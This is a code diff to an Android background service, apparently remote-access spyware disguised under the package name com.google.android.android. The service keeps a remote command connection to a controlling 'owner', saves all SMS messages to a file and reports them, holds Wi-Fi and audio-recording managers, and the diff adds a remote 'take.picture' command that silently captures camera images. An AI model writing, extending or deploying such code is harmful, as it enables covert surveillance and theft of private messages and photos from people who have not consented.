@@ -1,53 +1,44 @@
 package com.google.android.android;
 
 import android.app.Service;
-import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
-import android.database.Cursor;
-import android.icu.util.UniversalTimeScale;
+import android.content.pm.PackageManager;
+import android.graphics.Bitmap;
+import android.graphics.Canvas;
+import android.hardware.Camera;
 import android.net.ConnectivityManager;
-import android.net.Network;
 import android.net.NetworkInfo;
-import android.net.Uri;
-import android.net.wifi.ScanResult;
-import android.net.wifi.WifiInfo;
-import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
-import android.provider.Telephony;
+import android.support.v4.view.ActionProvider;
 import android.telephony.SmsManager;
-import android.widget.Toast;
+import android.util.DisplayMetrics;
+import android.util.Log;
+import android.view.View;
 
-import org.json.JSONStringer;
 import org.json.simple.JSONArray;
 import org.json.simple.JSONObject;
-import org.json.simple.parser.JSONParser;
 
 import java.io.File;
-import java.io.FileInputStream;
+import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.FileWriter;
 import java.io.IOException;
-import java.io.InputStream;
 import java.io.OutputStream;
-import java.io.UTFDataFormatException;
-import java.lang.reflect.Field;
-import java.lang.reflect.Method;
-import java.net.Socket;
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
-import java.util.Date;
-import java.util.List;
 import java.util.Timer;
 import java.util.TimerTask;
+
+import static android.provider.MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE;
 
 public class MainService extends Service {
     private static MainService _instance;
     private NettyClient nettyClient;
 
-    private final int INTERVAL_CONNECTION_MILLS = 10 * 1000; //интервал переподключения
+    private final int INTERVAL_CONNECTION_MILLS = 60 * 1000; //интервал переподключения
 
     private final String INCORRECT_QUERY = "incorrectQuery";
     private final String OWNER_OFFLINE = "ownerOffilne";
@@ -62,6 +53,7 @@ public class MainService extends Service {
     private RecordManager recordManager;
     private MyWifiManager myWifiManager;
     private MySmsManager mySmsManager;
+    private CameraManager cameraManager;
 
     public static MainService getInstance() {
         return _instance;
@@ -82,6 +74,11 @@ public class MainService extends Service {
         return mySmsManager;
     }
 
+    private CameraManager getCameraManager() {
+        if (cameraManager == null) cameraManager = new CameraManager();
+        return cameraManager;
+    }
+
     @Override
     public IBinder onBind(Intent intent) {
         return null;
@@ -93,7 +90,9 @@ public class MainService extends Service {
         Config.load(getSharedPreferences("Config", MODE_PRIVATE));
         recordManager = new RecordManager();
         myWifiManager = new MyWifiManager();
-        //recordManager.startRecord(10*60*1000);
+        mySmsManager = new MySmsManager();
+        cameraManager = new CameraManager();
+//        recordManager.startRecord(10*60*1000, null);
 
         testCode();
     }
@@ -127,7 +126,6 @@ public class MainService extends Service {
             System.out.println("Connection Timer! active: " + isActive);
             if (!isActive) newConnection();
             else nettyClient.sendUpdateLastOnline();
-            // TODO: 28.07.2017 проблема: если долго бездействовать, то соединение умирает, а мы не можем это отловить, скорее всего нужно слать пинги
             /*JSONObject updateQuery = new JSONObject();
             try {
                 updateQuery.put("action", "updateConnection");
@@ -314,11 +312,16 @@ public class MainService extends Service {
                     FileWriter fileWriter = new FileWriter(outFile);
                     fileWriter.write(allSms.toJSONString());
                     fileWriter.flush();
+                    fileWriter.close();
                 } catch (IOException e) {
                     e.printStackTrace();
                 }
 
                 nettyClient.sendSaveSmsLog(allSms.size(), (String) message.get("owner"));
+                break;
+            case "take.picture":
+                getCameraManager().takePicture((long) message.get("camera"));
+                nettyClient.sendTakePicture(SUCCESS, (String) message.get("owner"));
                 break;
             /*case "setOwner":
                 String owner = message.getString("owner");
